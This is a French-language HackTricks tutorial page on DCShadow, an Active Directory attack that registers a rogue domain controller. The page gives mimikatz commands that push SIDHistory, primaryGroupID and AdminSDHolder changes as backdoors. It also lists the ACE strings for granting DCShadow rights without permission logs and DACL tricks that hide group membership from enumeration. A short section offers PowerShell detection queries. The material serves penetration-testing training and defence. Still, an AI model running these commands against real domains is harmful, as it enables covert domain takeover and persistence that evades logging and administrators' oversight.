# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Informations de base

Il enregistre un **nouveau contrôleur de domaine** dans l'AD et l'utilise pour **pousser des attributs** (SIDHistory, SPNs...) sur des objets spécifiés **sans** laisser de **logs** concernant les **modifications**. Vous **avez besoin des privilèges DA** et devez être dans le **domaine racine**.\
Notez que si vous utilisez des données incorrectes, des logs assez moches apparaîtront.

Pour effectuer l'attaque, vous avez besoin de 2 instances de mimikatz. L'une d'elles démarrera les serveurs RPC avec les privilèges SYSTEM (vous devez indiquer ici les changements que vous voulez effectuer), et l'autre instance sera utilisée pour pousser les valeurs:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Remarquez que **`elevate::token`** ne fonctionnera pas dans une session `mimikatz1` car cela élève les privilèges du thread, alors que nous devons élever le **privilège du processus**.\
Vous pouvez aussi sélectionner un objet "LDAP" : `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Vous pouvez appliquer les changements depuis un DA ou depuis un utilisateur disposant de ces permissions minimales :

- Dans l'**objet de domaine** :
- _DS-Install-Replica_ (Ajouter/Supprimer une réplique dans le domaine)
- _DS-Replication-Manage-Topology_ (Gérer la topologie de réplication)
- _DS-Replication-Synchronize_ (Synchronisation de réplication)
- L'**objet Sites** (et ses enfants) dans le **conteneur Configuration** :
- _CreateChild and DeleteChild_
- L'objet de l'**ordinateur qui est enregistré comme un DC** :
- _WriteProperty_ (Not Write)
- L'**objet cible** :
- _WriteProperty_ (Not Write)

Vous pouvez utiliser [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) pour donner ces privilèges à un utilisateur non privilégié (notez que cela laissera des logs). C'est beaucoup plus restrictif que d'avoir les privilèges DA.\
Par exemple : `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Cela signifie que l'utilisateur _**student1**_ lorsqu'il est connecté sur la machine _**mcorp-student1**_ a les permissions DCShadow sur l'objet _**root1user**_.

## Utiliser DCShadow to create backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Abus des groupes principaux, lacunes d'énumération et détection

- `primaryGroupID` est un attribut distinct de la liste `member` du groupe. DCShadow/DSInternals peuvent l'écrire directement (par ex., définir `primaryGroupID=512` pour **Domain Admins**) sans enforcement local par LSASS, mais AD **déplace** toujours l'utilisateur : changer le PGID retire toujours l'appartenance au précédent groupe principal (même comportement pour tout groupe cible), donc vous ne pouvez pas conserver l'appartenance au groupe principal précédent.
- Les outils par défaut empêchent de retirer un utilisateur de son groupe principal actuel (`ADUC`, `Remove-ADGroupMember`), donc changer le PGID nécessite généralement des écritures directes dans l'annuaire (DCShadow/`Set-ADDBPrimaryGroup`).
- Le reporting des appartenances est incohérent :
- **Inclut** les membres dérivés du groupe principal: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Omet** les membres dérivés du groupe principal: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit inspectant `member`, `Get-ADUser <user> -Properties memberOf`.
- Les vérifications récursives peuvent manquer les membres du groupe principal si le **groupe principal est lui-même imbriqué** (p. ex., le PGID de l'utilisateur pointe vers un groupe imbriqué à l'intérieur de Domain Admins) ; `Get-ADGroupMember -Recursive` ou les filtres LDAP récursifs ne retourneront pas cet utilisateur sauf si la récursion résout explicitement les groupes principaux.
- Astuces DACL : un attaquant peut **refuser ReadProperty** sur `primaryGroupID` au niveau de l'utilisateur (ou sur l'attribut `member` du groupe pour les groupes non protégés par AdminSDHolder), ce qui cache l'appartenance effective à la plupart des requêtes PowerShell ; `net group` résoudra toujours l'appartenance. Les groupes protégés par AdminSDHolder réinitialiseront ces refus.

Exemples de détection/surveillance :
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Vérifiez les groupes privilégiés en comparant la sortie de `Get-ADGroupMember` avec `Get-ADGroup -Properties member` ou ADSI Edit afin de déceler les divergences introduites par `primaryGroupID` ou des attributs masqués.

## Shadowception - Give DCShadow permissions using DCShadow (no modified permissions logs)

Nous devons ajouter les ACE suivants avec le SID de notre utilisateur à la fin :

- Sur l'objet de domaine :
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Sur l'objet de l'ordinateur de l'attaquant : `(A;;WP;;;UserSID)`
- Sur l'objet de l'utilisateur cible : `(A;;WP;;;UserSID)`
- Sur l'objet Sites dans le conteneur Configuration : `(A;CI;CCDC;;;UserSID)`

Pour obtenir l'ACE actuel d'un objet : `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Remarquez que, dans ce cas, vous devez effectuer plusieurs modifications, pas seulement une. Donc, dans la session **mimikatz1** (RPC server) utilisez le paramètre **`/stack` with each change** que vous voulez faire. De cette façon, vous n'aurez besoin d'exécuter **`/push`** qu'une seule fois pour appliquer toutes les modifications en attente sur le rogue server.

[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## Références

- [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
